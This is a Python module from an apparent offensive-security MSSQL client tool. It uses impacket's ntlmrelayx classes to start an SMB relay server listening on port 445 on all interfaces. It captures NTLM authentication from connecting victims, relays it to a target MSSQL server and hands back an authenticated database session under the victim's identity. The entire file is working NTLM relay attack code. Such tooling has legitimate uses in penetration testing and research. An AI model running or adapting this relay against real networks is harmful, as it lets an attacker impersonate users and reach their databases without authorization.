# mssqlclient_ng/core/services/ntlmrelay.py

# Built-in imports
import sys
import threading

# Third party imports
from loguru import logger

from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS, ProtocolAttack
from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

# Local imports
from ..models.server import Server
from ..utils.storage import get_data_dir
from .database import DatabaseContext


class RelayMSSQL:
    """
    NTLM Relay server for MSSQL authentication capture.
    Manages relay servers and captured authenticated clients.
    """

    def __init__(self, hostname: str, port: int = 1433):
        self._threads: set = set()
        self._captured_client: dict | None = None
        self._capture_event = threading.Event()

        minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}

        self._targets_processor = TargetsProcessor(
            singleTarget=f"mssql://{hostname}:{port}",
            protocolClients=minimal_protocol_clients,
        )

        self._register_attack()

    def _register_attack(self):
        """Register custom attack class that captures to this instance."""
        relay_instance = self

        class CustomMSSQLAttack(ProtocolAttack):
            PLUGIN_NAMES = ["MSSQL"]

            def run(self):
                logger.success(
                    f"Successfully relayed authentication for {self.domain}\\{self.username}"
                )
                relay_instance._captured_client = {
                    "client": self.client,
                    "username": self.username,
                    "domain": self.domain,
                }
                relay_instance._capture_event.set()
                return True

        PROTOCOL_ATTACKS["MSSQL"] = CustomMSSQLAttack

    def start(self, smb2support: bool = False, ntlmchallenge: str | None = None):
        minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}

        loot_dir = str(get_data_dir() / "relay-loot")

        c = NTLMRelayxConfig()
        c.setProtocolClients(minimal_protocol_clients)
        c.setTargets(self._targets_processor)
        c.setExeFile(None)
        c.setCommand(None)
        c.setEnumLocalAdmins(None)
        c.setAddComputerSMB(None)
        c.setDisableMulti(True)
        c.setKeepRelaying(False)
        c.setEncoding(sys.getdefaultencoding())
        c.setMode("RELAY")
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir(loot_dir)
        c.setOutputFile(None)
        c.setdumpHashes(False)
        c.setSMB2Support(smb2support)
        c.setSMBChallenge(ntlmchallenge)
        c.setInterfaceIp("0.0.0.0")
        c.setListeningPort(445)

        s = SMBRelayServer(c)
        s.start()
        self._threads.add(s)

        logger.info("SMB relay server listening on 0.0.0.0:445")

    def wait_for_connection(
        self, server_instance: Server, timeout: int = 60
    ) -> DatabaseContext | None:
        """
        Wait for a relayed connection and create a DatabaseContext from it.

        Returns:
            DatabaseContext instance, or None if timeout or auth failure.
        """
        logger.info(f"Waiting up to {timeout}s for a relayed connection")

        captured = self._capture_event.wait(timeout=timeout)

        if not captured or self._captured_client is None:
            logger.warning(f"No relayed connection received within {timeout}s")
            return None

        mssql_client = self._captured_client["client"]
        username = self._captured_client["username"]
        domain = self._captured_client["domain"]

        logger.success("Relayed connection captured")
        logger.trace(
            f"Creating DatabaseContext for {domain}\\{username}@{server_instance.hostname}"
        )

        database_context = DatabaseContext(
            server=server_instance, mssql_instance=mssql_client
        )
        database_context.server.mapped_user = (
            f"{domain}\\{username}" if domain else username
        )

        return database_context

    def stop_servers(self):
        """Stop all relay servers."""
        for thread in list(self._threads):
            if isinstance(thread, SMBRelayServer):
                try:
                    thread.server.shutdown()
                except Exception as exc:
                    logger.debug(f"Error shutting down relay server: {exc}")
            self._threads.discard(thread)
